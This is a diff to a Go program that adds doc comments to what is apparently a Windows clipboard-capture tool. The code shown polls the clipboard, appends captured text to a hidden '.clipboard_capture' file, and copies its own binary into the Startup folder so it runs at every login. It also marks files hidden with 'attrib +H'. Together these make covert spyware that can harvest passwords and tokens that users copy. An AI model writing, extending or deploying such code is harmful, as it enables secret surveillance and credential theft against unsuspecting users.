@@ -45,6 +45,7 @@ func main() {
 	readClipboard(ticker, hiddenFile)
 }
 
+// readClipboard polls the clipboard at intervals and stores new clipboard data to disk
 func readClipboard(ticker *time.Ticker, hiddenFile string) {
 	var last string
 
@@ -63,6 +64,7 @@ func readClipboard(ticker *time.Ticker, hiddenFile string) {
 	}
 }
 
+// storeClipboard appends clipboard data to .clipboard_capture file
 func storeClipboard(path, data string) {
 	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 	check(err)
@@ -74,7 +76,7 @@ func storeClipboard(path, data string) {
 	check(err)
 }
 
-// Copy the binary to the Windows Startup folder for autorun at login
+// setupPersistence copies the binary to the Windows Startup folder for autorun at login
 func setupPersistence() error {
 	appData := os.Getenv("APPDATA")
 	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
@@ -110,18 +112,21 @@ func copyBinary(src, dst string) error {
 	check(err)
 	return nil
 }
+
 // hideFile sets the hidden attribute on a file in Windows
 func hideFile(path string) error {
 	cmd := exec.Command("attrib", "+H", path)
 	return cmd.Run()
 }
 
+// check panics or exits if err is non-nil
 func check(err error) {
 	if err != nil {
 		panic(err)
 	}
 }
 
+// summarize truncates long clipboard strings for readable output
 func summarize(s string) string {
 	// Keep output readable: show up to 300 chars
 	if len(s) > 300 {
